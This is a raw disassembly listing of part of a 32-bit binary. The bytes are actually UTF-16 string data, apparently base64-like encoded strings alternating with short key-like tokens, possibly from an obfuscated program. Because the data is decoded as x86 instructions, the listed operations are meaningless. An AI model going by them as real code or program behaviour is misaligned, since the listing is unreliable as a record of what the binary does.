10003b8e:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
10003b92:	00 55 00             	add    %dl,0x0(%ebp)
10003b95:	34 00                	xor    $0x0,%al
10003b97:	64 00 32             	add    %dh,%fs:(%edx)
10003b9a:	00 4a 00             	add    %cl,0x0(%edx)
10003b9d:	74 00                	je     0x10003b9f
10003b9f:	4d                   	dec    %ebp
10003ba0:	00 55 00             	add    %dl,0x0(%ebp)
10003ba3:	51                   	push   %ecx
10003ba4:	00 31                	add    %dh,(%ecx)
10003ba6:	00 4e 00             	add    %cl,0x0(%esi)
10003ba9:	44                   	inc    %esp
10003baa:	00 52 00             	add    %dl,0x0(%edx)
10003bad:	32 00                	xor    (%eax),%al
10003baf:	5a                   	pop    %edx
10003bb0:	00 6b 00             	add    %ch,0x0(%ebx)
10003bb3:	39 00                	cmp    %eax,(%eax)
10003bb5:	46                   	inc    %esi
10003bb6:	00 4f 00             	add    %cl,0x0(%edi)
10003bb9:	44                   	inc    %esp
10003bba:	00 46 00             	add    %al,0x0(%esi)
10003bbd:	45                   	inc    %ebp
10003bbe:	00 4e 00             	add    %cl,0x0(%esi)
10003bc1:	54                   	push   %esp
10003bc2:	00 51 00             	add    %dl,0x0(%ecx)
10003bc5:	30 00                	xor    %al,(%eax)
10003bc7:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003bcb:	5a                   	pop    %edx
10003bcc:	00 50 00             	add    %dl,0x0(%eax)
10003bcf:	52                   	push   %edx
10003bd0:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
10003bd4:	00 57 00             	add    %dl,0x0(%edi)
10003bd7:	4d                   	dec    %ebp
10003bd8:	00 46 00             	add    %al,0x0(%esi)
10003bdb:	67 00 78 00          	add    %bh,0x0(%bx,%si)
10003bdf:	52                   	push   %edx
10003be0:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10003be4:	00 30                	add    %dh,(%eax)
10003be6:	00 4e 00             	add    %cl,0x0(%esi)
10003be9:	48                   	dec    %eax
10003bea:	00 5a 00             	add    %bl,0x0(%edx)
10003bed:	6d                   	insl   (%dx),%es:(%edi)
10003bee:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
10003bf2:	00 55 00             	add    %dl,0x0(%ebp)
10003bf5:	34 00                	xor    $0x0,%al
10003bf7:	4d                   	dec    %ebp
10003bf8:	00 55 00             	add    %dl,0x0(%ebp)
10003bfb:	51                   	push   %ecx
10003bfc:	00 31                	add    %dh,(%ecx)
10003bfe:	00 4e 00             	add    %cl,0x0(%esi)
10003c01:	44                   	inc    %esp
10003c02:	00 52 00             	add    %dl,0x0(%edx)
10003c05:	32 00                	xor    (%eax),%al
10003c07:	5a                   	pop    %edx
10003c08:	00 6b 00             	add    %ch,0x0(%ebx)
10003c0b:	39 00                	cmp    %eax,(%eax)
10003c0d:	46                   	inc    %esi
10003c0e:	00 4f 00             	add    %cl,0x0(%edi)
10003c11:	44                   	inc    %esp
10003c12:	00 4e 00             	add    %cl,0x0(%esi)
10003c15:	4b                   	dec    %ebx
10003c16:	00 62 00             	add    %ah,0x0(%edx)
10003c19:	44                   	inc    %esp
10003c1a:	00 46 00             	add    %al,0x0(%esi)
10003c1d:	45                   	inc    %ebp
10003c1e:	00 4e 00             	add    %cl,0x0(%esi)
10003c21:	54                   	push   %esp
10003c22:	00 51 00             	add    %dl,0x0(%ecx)
10003c25:	30 00                	xor    %al,(%eax)
10003c27:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003c2b:	5a                   	pop    %edx
10003c2c:	00 50 00             	add    %dl,0x0(%eax)
10003c2f:	52                   	push   %edx
10003c30:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003c34:	00 78 00             	add    %bh,0x0(%eax)
10003c37:	52                   	push   %edx
10003c38:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10003c3c:	00 30                	add    %dh,(%eax)
10003c3e:	00 4e 00             	add    %cl,0x0(%esi)
10003c41:	48                   	dec    %eax
10003c42:	00 5a 00             	add    %bl,0x0(%edx)
10003c45:	6d                   	insl   (%dx),%es:(%edi)
10003c46:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
10003c4a:	00 55 00             	add    %dl,0x0(%ebp)
10003c4d:	34 00                	xor    $0x0,%al
10003c4f:	57                   	push   %edi
10003c50:	00 6a 00             	add    %ch,0x0(%edx)
10003c53:	4e                   	dec    %esi
10003c54:	00 4f 00             	add    %cl,0x0(%edi)
10003c57:	4d                   	dec    %ebp
10003c58:	00 55 00             	add    %dl,0x0(%ebp)
10003c5b:	51                   	push   %ecx
10003c5c:	00 31                	add    %dh,(%ecx)
10003c5e:	00 4e 00             	add    %cl,0x0(%esi)
10003c61:	44                   	inc    %esp
10003c62:	00 52 00             	add    %dl,0x0(%edx)
10003c65:	32 00                	xor    (%eax),%al
10003c67:	5a                   	pop    %edx
10003c68:	00 6b 00             	add    %ch,0x0(%ebx)
10003c6b:	39 00                	cmp    %eax,(%eax)
10003c6d:	46                   	inc    %esi
10003c6e:	00 4f 00             	add    %cl,0x0(%edi)
10003c71:	44                   	inc    %esp
10003c72:	00 46 00             	add    %al,0x0(%esi)
10003c75:	45                   	inc    %ebp
10003c76:	00 4e 00             	add    %cl,0x0(%esi)
10003c79:	54                   	push   %esp
10003c7a:	00 51 00             	add    %dl,0x0(%ecx)
10003c7d:	30 00                	xor    %al,(%eax)
10003c7f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003c83:	5a                   	pop    %edx
10003c84:	00 50 00             	add    %dl,0x0(%eax)
10003c87:	52                   	push   %edx
10003c88:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
10003c8c:	00 34 00             	add    %dh,(%eax,%eax,1)
10003c8f:	59                   	pop    %ecx
10003c90:	00 6b 00             	add    %ch,0x0(%ebx)
10003c93:	45                   	inc    %ebp
10003c94:	00 78 00             	add    %bh,0x0(%eax)
10003c97:	52                   	push   %edx
10003c98:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10003c9c:	00 30                	add    %dh,(%eax)
10003c9e:	00 4e 00             	add    %cl,0x0(%esi)
10003ca1:	48                   	dec    %eax
10003ca2:	00 5a 00             	add    %bl,0x0(%edx)
10003ca5:	6d                   	insl   (%dx),%es:(%edi)
10003ca6:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
10003caa:	00 55 00             	add    %dl,0x0(%ebp)
10003cad:	34 00                	xor    $0x0,%al
10003caf:	4d                   	dec    %ebp
10003cb0:	00 55 00             	add    %dl,0x0(%ebp)
10003cb3:	51                   	push   %ecx
10003cb4:	00 31                	add    %dh,(%ecx)
10003cb6:	00 4e 00             	add    %cl,0x0(%esi)
10003cb9:	44                   	inc    %esp
10003cba:	00 52 00             	add    %dl,0x0(%edx)
10003cbd:	32 00                	xor    (%eax),%al
10003cbf:	5a                   	pop    %edx
10003cc0:	00 6b 00             	add    %ch,0x0(%ebx)
10003cc3:	39 00                	cmp    %eax,(%eax)
10003cc5:	46                   	inc    %esi
10003cc6:	00 4f 00             	add    %cl,0x0(%edi)
10003cc9:	44                   	inc    %esp
10003cca:	00 30                	add    %dh,(%eax)
10003ccc:	00 39                	add    %bh,(%ecx)
10003cce:	00 4d 00             	add    %cl,0x0(%ebp)
10003cd1:	55                   	push   %ebp
10003cd2:	00 51 00             	add    %dl,0x0(%ecx)
10003cd5:	31 00                	xor    %eax,(%eax)
10003cd7:	4e                   	dec    %esi
10003cd8:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003cdc:	00 32                	add    %dh,(%edx)
10003cde:	00 5a 00             	add    %bl,0x0(%edx)
10003ce1:	6b 00 39             	imul   $0x39,(%eax),%eax
10003ce4:	00 46 00             	add    %al,0x0(%esi)
10003ce7:	4f                   	dec    %edi
10003ce8:	00 41 00             	add    %al,0x0(%ecx)
10003ceb:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003cf0:	15 31 00 44 00       	adc    $0x440031,%eax
10003cf5:	35 00 34 00 34       	xor    $0x34003400,%eax
10003cfa:	00 76 00             	add    %dh,0x0(%esi)
10003cfd:	66 00 4f 00          	data16 add %cl,0x0(%edi)
10003d01:	45                   	inc    %ebp
10003d02:	00 38                	add    %bh,(%eax)
10003d04:	00 00                	add    %al,(%eax)
10003d06:	81 b1 61 00 31 00 41 	xorl   $0x340041,0x310061(%ecx)
10003d0d:	00 34 00 
10003d10:	53                   	push   %ebx
10003d11:	00 6d 00             	add    %ch,0x0(%ebp)
10003d14:	5a                   	pop    %edx
10003d15:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003d19:	00 45 00             	add    %al,0x0(%ebp)
10003d1c:	68 00 79 00 62       	push   $0x62007900
10003d21:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003d25:	00 59 00             	add    %bl,0x0(%ecx)
10003d28:	54                   	push   %esp
10003d29:	00 6d 00             	add    %ch,0x0(%ebp)
10003d2c:	74 00                	je     0x10003d2e
10003d2e:	51                   	push   %ecx
10003d2f:	00 4f 00             	add    %cl,0x0(%edi)
10003d32:	45                   	inc    %ebp
10003d33:	00 70 00             	add    %dh,0x0(%eax)
10003d36:	6d                   	insl   (%dx),%es:(%edi)
10003d37:	00 53 00             	add    %dl,0x0(%ebx)
10003d3a:	33 00                	xor    (%eax),%eax
10003d3c:	68 00 49 00 63       	push   $0x63004900
10003d41:	00 6d 00             	add    %ch,0x0(%ebp)
10003d44:	35 00 72 00 55       	xor    $0x55007200,%eax
10003d49:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
10003d4d:	00 4b 00             	add    %cl,0x0(%ebx)
10003d50:	5a                   	pop    %edx
10003d51:	00 6b 00             	add    %ch,0x0(%ebx)
10003d54:	74 00                	je     0x10003d56
10003d56:	34 00                	xor    $0x0,%al
10003d58:	53                   	push   %ebx
10003d59:	00 48 00             	add    %cl,0x0(%eax)
10003d5c:	4a                   	dec    %edx
10003d5d:	00 75 00             	add    %dh,0x0(%ebp)
10003d60:	64 00 32             	add    %dh,%fs:(%edx)
10003d63:	00 4a 00             	add    %cl,0x0(%edx)
10003d66:	74 00                	je     0x10003d68
10003d68:	61                   	popa
10003d69:	00 31                	add    %dh,(%ecx)
10003d6b:	00 41 00             	add    %al,0x0(%ecx)
10003d6e:	34 00                	xor    $0x0,%al
10003d70:	53                   	push   %ebx
10003d71:	00 6d 00             	add    %ch,0x0(%ebp)
10003d74:	5a                   	pop    %edx
10003d75:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003d79:	00 45 00             	add    %al,0x0(%ebp)
10003d7c:	68 00 79 00 62       	push   $0x62007900
10003d81:	00 6d 00             	add    %ch,0x0(%ebp)
10003d84:	74 00                	je     0x10003d86
10003d86:	51                   	push   %ecx
10003d87:	00 4f 00             	add    %cl,0x0(%edi)
10003d8a:	45                   	inc    %ebp
10003d8b:	00 70 00             	add    %dh,0x0(%eax)
10003d8e:	6d                   	insl   (%dx),%es:(%edi)
10003d8f:	00 53 00             	add    %dl,0x0(%ebx)
10003d92:	33 00                	xor    (%eax),%eax
10003d94:	68 00 49 00 63       	push   $0x63004900
10003d99:	00 6d 00             	add    %ch,0x0(%ebp)
10003d9c:	35 00 57 00 4d       	xor    $0x4d005700,%eax
10003da1:	00 46 00             	add    %al,0x0(%esi)
10003da4:	68 00 72 00 55       	push   $0x55007200
10003da9:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
10003dad:	00 4b 00             	add    %cl,0x0(%ebx)
10003db0:	5a                   	pop    %edx
10003db1:	00 6b 00             	add    %ch,0x0(%ebx)
10003db4:	74 00                	je     0x10003db6
10003db6:	34 00                	xor    $0x0,%al
10003db8:	53                   	push   %ebx
10003db9:	00 48 00             	add    %cl,0x0(%eax)
10003dbc:	4a                   	dec    %edx
10003dbd:	00 75 00             	add    %dh,0x0(%ebp)
10003dc0:	61                   	popa
10003dc1:	00 31                	add    %dh,(%ecx)
10003dc3:	00 41 00             	add    %al,0x0(%ecx)
10003dc6:	34 00                	xor    $0x0,%al
10003dc8:	53                   	push   %ebx
10003dc9:	00 6d 00             	add    %ch,0x0(%ebp)
10003dcc:	5a                   	pop    %edx
10003dcd:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003dd1:	00 45 00             	add    %al,0x0(%ebp)
10003dd4:	68 00 79 00 62       	push   $0x62007900
10003dd9:	00 6a 00             	add    %ch,0x0(%edx)
10003ddc:	4a                   	dec    %edx
10003ddd:	00 4f 00             	add    %cl,0x0(%edi)
10003de0:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003de4:	74 00                	je     0x10003de6
10003de6:	51                   	push   %ecx
10003de7:	00 4f 00             	add    %cl,0x0(%edi)
10003dea:	45                   	inc    %ebp
10003deb:	00 70 00             	add    %dh,0x0(%eax)
10003dee:	6d                   	insl   (%dx),%es:(%edi)
10003def:	00 53 00             	add    %dl,0x0(%ebx)
10003df2:	33 00                	xor    (%eax),%eax
10003df4:	68 00 49 00 63       	push   $0x63004900
10003df9:	00 6d 00             	add    %ch,0x0(%ebp)
10003dfc:	35 00 72 00 55       	xor    $0x55007200,%eax
10003e01:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
10003e05:	00 4b 00             	add    %cl,0x0(%ebx)
10003e08:	5a                   	pop    %edx
10003e09:	00 6b 00             	add    %ch,0x0(%ebx)
10003e0c:	74 00                	je     0x10003e0e
10003e0e:	34 00                	xor    $0x0,%al
10003e10:	53                   	push   %ebx
10003e11:	00 48 00             	add    %cl,0x0(%eax)
10003e14:	4a                   	dec    %edx
10003e15:	00 75 00             	add    %dh,0x0(%ebp)
10003e18:	59                   	pop    %ecx
10003e19:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003e1d:	00 43 00             	add    %al,0x0(%ebx)
10003e20:	61                   	popa
10003e21:	00 31                	add    %dh,(%ecx)
10003e23:	00 41 00             	add    %al,0x0(%ecx)
10003e26:	34 00                	xor    $0x0,%al
10003e28:	53                   	push   %ebx
10003e29:	00 6d 00             	add    %ch,0x0(%ebp)
10003e2c:	5a                   	pop    %edx
10003e2d:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003e31:	00 45 00             	add    %al,0x0(%ebp)
10003e34:	68 00 79 00 62       	push   $0x62007900
10003e39:	00 6d 00             	add    %ch,0x0(%ebp)
10003e3c:	74 00                	je     0x10003e3e
10003e3e:	51                   	push   %ecx
10003e3f:	00 4f 00             	add    %cl,0x0(%edi)
10003e42:	45                   	inc    %ebp
10003e43:	00 70 00             	add    %dh,0x0(%eax)
10003e46:	6d                   	insl   (%dx),%es:(%edi)
10003e47:	00 53 00             	add    %dl,0x0(%ebx)
10003e4a:	33 00                	xor    (%eax),%eax
10003e4c:	68 00 49 00 63       	push   $0x63004900
10003e51:	00 6d 00             	add    %ch,0x0(%ebp)
10003e54:	35 00 77 00 59       	xor    $0x59007700,%eax
10003e59:	00 6b 00             	add    %ch,0x0(%ebx)
10003e5c:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
10003e60:	55                   	push   %ebp
10003e61:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
10003e65:	00 4b 00             	add    %cl,0x0(%ebx)
10003e68:	5a                   	pop    %edx
10003e69:	00 6b 00             	add    %ch,0x0(%ebx)
10003e6c:	74 00                	je     0x10003e6e
10003e6e:	34 00                	xor    $0x0,%al
10003e70:	53                   	push   %ebx
10003e71:	00 48 00             	add    %cl,0x0(%eax)
10003e74:	4a                   	dec    %edx
10003e75:	00 75 00             	add    %dh,0x0(%ebp)
10003e78:	61                   	popa
10003e79:	00 31                	add    %dh,(%ecx)
10003e7b:	00 41 00             	add    %al,0x0(%ecx)
10003e7e:	34 00                	xor    $0x0,%al
10003e80:	53                   	push   %ebx
10003e81:	00 6d 00             	add    %ch,0x0(%ebp)
10003e84:	5a                   	pop    %edx
10003e85:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003e89:	00 45 00             	add    %al,0x0(%ebp)
10003e8c:	68 00 79 00 62       	push   $0x62007900
10003e91:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10003e95:	00 35 00 61 00 31    	add    %dh,0x31006100
10003e9b:	00 41 00             	add    %al,0x0(%ecx)
10003e9e:	34 00                	xor    $0x0,%al
10003ea0:	53                   	push   %ebx
10003ea1:	00 6d 00             	add    %ch,0x0(%ebp)
10003ea4:	5a                   	pop    %edx
10003ea5:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
10003ea9:	00 45 00             	add    %al,0x0(%ebp)
10003eac:	68 00 79 00 62       	push   $0x62007900
10003eb1:	00 67 00             	add    %ah,0x0(%edi)
10003eb4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003eb9:	15 6b 00 50 00       	adc    $0x50006b,%eax
10003ebe:	38 00                	cmp    %al,(%eax)
10003ec0:	4a                   	dec    %edx
10003ec1:	00 66 00             	add    %ah,0x0(%esi)
10003ec4:	4b                   	dec    %ebx
10003ec5:	00 78 00             	add    %bh,0x0(%eax)
10003ec8:	48                   	dec    %eax
10003ec9:	00 72 00             	add    %dh,0x0(%edx)
10003ecc:	6e                   	outsb  %ds:(%esi),(%dx)
10003ecd:	00 00                	add    %al,(%eax)
10003ecf:	80 b9 63 00 32 00 34 	cmpb   $0x34,0x320063(%ecx)
10003ed6:	00 30                	add    %dh,(%eax)
10003ed8:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
10003edc:	00 51 00             	add    %dl,0x0(%ecx)
10003edf:	7a 00                	jp     0x10003ee1
10003ee1:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10003ee5:	4e                   	dec    %esi
10003ee6:	00 58 00             	add    %bl,0x0(%eax)
10003ee9:	54                   	push   %esp
10003eea:	00 56 00             	add    %dl,0x0(%esi)
10003eed:	56                   	push   %esi
10003eee:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
10003ef2:	00 6e 00             	add    %ch,0x0(%esi)
10003ef5:	4e                   	dec    %esi
10003ef6:	00 75 00             	add    %dh,0x0(%ebp)
10003ef9:	4e                   	dec    %esi
10003efa:	00 45 00             	add    %al,0x0(%ebp)
10003efd:	38 00                	cmp    %al,(%eax)
10003eff:	30 00                	xor    %al,(%eax)
10003f01:	4d                   	dec    %ebp
10003f02:	00 33                	add    %dh,(%ebx)
10003f04:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10003f08:	00 56 00             	add    %dl,0x0(%esi)
10003f0b:	30 00                	xor    %al,(%eax)
10003f0d:	31 00                	xor    %eax,(%eax)
10003f0f:	7a 00                	jp     0x10003f11
10003f11:	62 00                	bound  %eax,(%eax)
10003f13:	6a 00                	push   $0x0
10003f15:	52                   	push   %edx
10003f16:	00 50 00             	add    %dl,0x0(%eax)
10003f19:	4e                   	dec    %esi
10003f1a:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
10003f1e:	00 35 00 55 00 31    	add    %dh,0x31005500
10003f24:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003f28:	00 62 00             	add    %ah,0x0(%edx)
10003f2b:	6c                   	insb   (%dx),%es:(%edi)
10003f2c:	00 46 00             	add    %al,0x0(%esi)
10003f2f:	59                   	pop    %ecx
10003f30:	00 63 00             	add    %ah,0x0(%ebx)
10003f33:	32 00                	xor    (%eax),%al
10003f35:	34 00                	xor    $0x0,%al
10003f37:	30 00                	xor    %al,(%eax)
10003f39:	54                   	push   %esp
10003f3a:	00 7a 00             	add    %bh,0x0(%edx)
10003f3d:	51                   	push   %ecx
10003f3e:	00 7a 00             	add    %bh,0x0(%edx)
10003f41:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10003f45:	4e                   	dec    %esi
10003f46:	00 58 00             	add    %bl,0x0(%eax)
10003f49:	54                   	push   %esp
10003f4a:	00 58 00             	add    %bl,0x0(%eax)
10003f4d:	4e                   	dec    %esi
10003f4e:	00 75 00             	add    %dh,0x0(%ebp)
10003f51:	4e                   	dec    %esi
10003f52:	00 45 00             	add    %al,0x0(%ebp)
10003f55:	38 00                	cmp    %al,(%eax)
10003f57:	30 00                	xor    %al,(%eax)
10003f59:	4d                   	dec    %ebp
10003f5a:	00 33                	add    %dh,(%ebx)
10003f5c:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10003f60:	00 56 00             	add    %dl,0x0(%esi)
10003f63:	30 00                	xor    %al,(%eax)
10003f65:	31 00                	xor    %eax,(%eax)
10003f67:	4f                   	dec    %edi
10003f68:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10003f6c:	00 4e 00             	add    %cl,0x0(%esi)
10003f6f:	75 00                	jne    0x10003f71
10003f71:	4e                   	dec    %esi
10003f72:	00 45 00             	add    %al,0x0(%ebp)
10003f75:	38 00                	cmp    %al,(%eax)
10003f77:	30 00                	xor    %al,(%eax)
10003f79:	4d                   	dec    %ebp
10003f7a:	00 33                	add    %dh,(%ebx)
10003f7c:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10003f80:	00 56 00             	add    %dl,0x0(%esi)
10003f83:	30 00                	xor    %al,(%eax)
10003f85:	30 00                	xor    %al,(%eax)
10003f87:	3d 00 00 15 73       	cmp    $0x73150000,%eax
10003f8c:	00 6e 00             	add    %ch,0x0(%esi)
10003f8f:	34 00                	xor    $0x0,%al
10003f91:	4f                   	dec    %edi
10003f92:	00 34 00             	add    %dh,(%eax,%eax,1)
10003f95:	33 00                	xor    (%eax),%eax
10003f97:	79 00                	jns    0x10003f99
10003f99:	53                   	push   %ebx
10003f9a:	00 57 00             	add    %dl,0x0(%edi)
10003f9d:	4d                   	dec    %ebp
10003f9e:	00 00                	add    %al,(%eax)
10003fa0:	80 b9 62 00 46 00 4d 	cmpb   $0x4d,0x460062(%ecx)
10003fa7:	00 33                	add    %dh,(%ebx)
10003fa9:	00 4d 00             	add    %cl,0x0(%ebp)
10003fac:	6c                   	insb   (%dx),%es:(%edi)
10003fad:	00 52 00             	add    %dl,0x0(%edx)
10003fb0:	61                   	popa
10003fb1:	00 63 00             	add    %ah,0x0(%ebx)
10003fb4:	45                   	inc    %ebp
10003fb5:	00 4e 00             	add    %cl,0x0(%esi)
10003fb8:	54                   	push   %esp
10003fb9:	00 63 00             	add    %ah,0x0(%ebx)
10003fbc:	57                   	push   %edi
10003fbd:	00 46 00             	add    %al,0x0(%esi)
10003fc0:	58                   	pop    %eax
10003fc1:	00 65 00             	add    %ah,0x0(%ebp)
10003fc4:	47                   	inc    %edi
10003fc5:	00 78 00             	add    %bh,0x0(%eax)
10003fc8:	54                   	push   %esp
10003fc9:	00 4e 00             	add    %cl,0x0(%esi)
10003fcc:	7a 00                	jp     0x10003fce
10003fce:	4a                   	dec    %edx
10003fcf:	00 55 00             	add    %dl,0x0(%ebp)
10003fd2:	57                   	push   %edi
10003fd3:	00 6e 00             	add    %ch,0x0(%esi)
10003fd6:	42                   	inc    %edx
10003fd7:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10003fdb:	00 33                	add    %dh,(%ebx)
10003fdd:	00 46 00             	add    %al,0x0(%esi)
10003fe0:	73 00                	jae    0x10003fe2
10003fe2:	55                   	push   %ebp
10003fe3:	00 7a 00             	add    %bh,0x0(%edx)
10003fe6:	63 00                	arpl   %eax,(%eax)
10003fe8:	79 00                	jns    0x10003fea
10003fea:	56                   	push   %esi
10003feb:	00 46 00             	add    %al,0x0(%esi)
10003fee:	70 00                	jo     0x10003ff0
10003ff0:	77 00                	ja     0x10003ff2
10003ff2:	51                   	push   %ecx
10003ff3:	00 31                	add    %dh,(%ecx)
10003ff5:	00 4e 00             	add    %cl,0x0(%esi)
10003ff8:	78 00                	js     0x10003ffa
10003ffa:	61                   	popa
10003ffb:	00 47 00             	add    %al,0x0(%edi)
10003ffe:	4d                   	dec    %ebp
10003fff:	00 79 00             	add    %bh,0x0(%ecx)
10004002:	62 00                	bound  %eax,(%eax)
10004004:	46                   	inc    %esi
10004005:	00 4d 00             	add    %cl,0x0(%ebp)
10004008:	33 00                	xor    (%eax),%eax
1000400a:	4d                   	dec    %ebp
1000400b:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
1000400f:	00 61 00             	add    %ah,0x0(%ecx)
10004012:	63 00                	arpl   %eax,(%eax)
10004014:	45                   	inc    %ebp
10004015:	00 4e 00             	add    %cl,0x0(%esi)
10004018:	54                   	push   %esp
10004019:	00 63 00             	add    %ah,0x0(%ebx)
1000401c:	57                   	push   %edi
1000401d:	00 78 00             	add    %bh,0x0(%eax)
10004020:	54                   	push   %esp
10004021:	00 4e 00             	add    %cl,0x0(%esi)
10004024:	7a 00                	jp     0x10004026
10004026:	4a                   	dec    %edx
10004027:	00 55 00             	add    %dl,0x0(%ebp)
1000402a:	57                   	push   %edi
1000402b:	00 6e 00             	add    %ch,0x0(%esi)
1000402e:	42                   	inc    %edx
1000402f:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10004033:	00 33                	add    %dh,(%ebx)
10004035:	00 45 00             	add    %al,0x0(%ebp)
10004038:	77 00                	ja     0x1000403a
1000403a:	50                   	push   %eax
1000403b:	00 57 00             	add    %dl,0x0(%edi)
1000403e:	78 00                	js     0x10004040
10004040:	54                   	push   %esp
10004041:	00 4e 00             	add    %cl,0x0(%esi)
10004044:	7a 00                	jp     0x10004046
10004046:	4a                   	dec    %edx
10004047:	00 55 00             	add    %dl,0x0(%ebp)
1000404a:	57                   	push   %edi
1000404b:	00 6e 00             	add    %ch,0x0(%esi)
1000404e:	42                   	inc    %edx
1000404f:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10004053:	00 33                	add    %dh,(%ebx)
10004055:	00 45 00             	add    %al,0x0(%ebp)
10004058:	3d 00 00 15 6c       	cmp    $0x6c150000,%eax
1000405d:	00 53 00             	add    %dl,0x0(%ebx)
10004060:	37                   	aaa
10004061:	00 32                	add    %dh,(%edx)
10004063:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004067:	00 70 00             	add    %dh,0x0(%eax)
1000406a:	43                   	inc    %ebx
1000406b:	00 53 00             	add    %dl,0x0(%ebx)
1000406e:	71 00                	jno    0x10004070
10004070:	00 80 f9 54 00 33    	add    %al,0x330054f9(%eax)
10004076:	00 68 00             	add    %ch,0x0(%eax)
10004079:	43                   	inc    %ebx
1000407a:	00 5a 00             	add    %bl,0x0(%edx)
1000407d:	30 00                	xor    %al,(%eax)
1000407f:	5a                   	pop    %edx
10004080:	00 6b 00             	add    %ch,0x0(%ebx)
10004083:	55                   	push   %ebp
10004084:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004088:	00 33                	add    %dh,(%ebx)
1000408a:	00 5a 00             	add    %bl,0x0(%edx)
1000408d:	56                   	push   %esi
1000408e:	00 46 00             	add    %al,0x0(%esi)
10004091:	59                   	pop    %ecx
10004092:	00 51 00             	add    %dl,0x0(%ecx)
10004095:	6b 00 39             	imul   $0x39,(%eax),%eax
10004098:	00 34 00             	add    %dh,(%eax,%eax,1)
1000409b:	51                   	push   %ecx
1000409c:	00 6d 00             	add    %ch,0x0(%ebp)
1000409f:	64 00 47 00          	add    %al,%fs:0x0(%edi)
100040a3:	5a                   	pop    %edx
100040a4:	00 46 00             	add    %al,0x0(%esi)
100040a7:	4a                   	dec    %edx
100040a8:	00 55 00             	add    %dl,0x0(%ebp)
100040ab:	4e                   	dec    %esi
100040ac:	00 32                	add    %dh,(%edx)
100040ae:	00 56 00             	add    %dl,0x0(%esi)
100040b1:	50                   	push   %eax
100040b2:	00 65 00             	add    %ah,0x0(%ebp)
100040b5:	45                   	inc    %ebp
100040b6:	00 4a 00             	add    %cl,0x0(%edx)
100040b9:	6e                   	outsb  %ds:(%esi),(%dx)
100040ba:	00 52 00             	add    %dl,0x0(%edx)
100040bd:	6d                   	insl   (%dx),%es:(%edi)
100040be:	00 52 00             	add    %dl,0x0(%edx)
100040c1:	53                   	push   %ebx
100040c2:	00 56 00             	add    %dl,0x0(%esi)
100040c5:	44                   	inc    %esp
100040c6:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
100040ca:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
100040ce:	00 52 00             	add    %dl,0x0(%edx)
100040d1:	48                   	dec    %eax
100040d2:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
100040d6:	00 68 00             	add    %ch,0x0(%eax)
100040d9:	43                   	inc    %ebx
100040da:	00 5a 00             	add    %bl,0x0(%edx)
100040dd:	30 00                	xor    %al,(%eax)
100040df:	5a                   	pop    %edx
100040e0:	00 6b 00             	add    %ch,0x0(%ebx)
100040e3:	55                   	push   %ebp
100040e4:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100040e8:	00 33                	add    %dh,(%ebx)
100040ea:	00 5a 00             	add    %bl,0x0(%edx)
100040ed:	55                   	push   %ebp
100040ee:	00 39                	add    %bh,(%ecx)
100040f0:	00 34 00             	add    %dh,(%eax,%eax,1)
100040f3:	51                   	push   %ecx
100040f4:	00 6d 00             	add    %ch,0x0(%ebp)
100040f7:	64 00 47 00          	add    %al,%fs:0x0(%edi)
100040fb:	5a                   	pop    %edx
100040fc:	00 46 00             	add    %al,0x0(%esi)
100040ff:	4a                   	dec    %edx
10004100:	00 55 00             	add    %dl,0x0(%ebp)
10004103:	4e                   	dec    %esi
10004104:	00 32                	add    %dh,(%edx)
10004106:	00 56 00             	add    %dl,0x0(%esi)
10004109:	47                   	inc    %edi
1000410a:	00 4d 00             	add    %cl,0x0(%ebp)
1000410d:	57                   	push   %edi
1000410e:	00 4a 00             	add    %cl,0x0(%edx)
10004111:	50                   	push   %eax
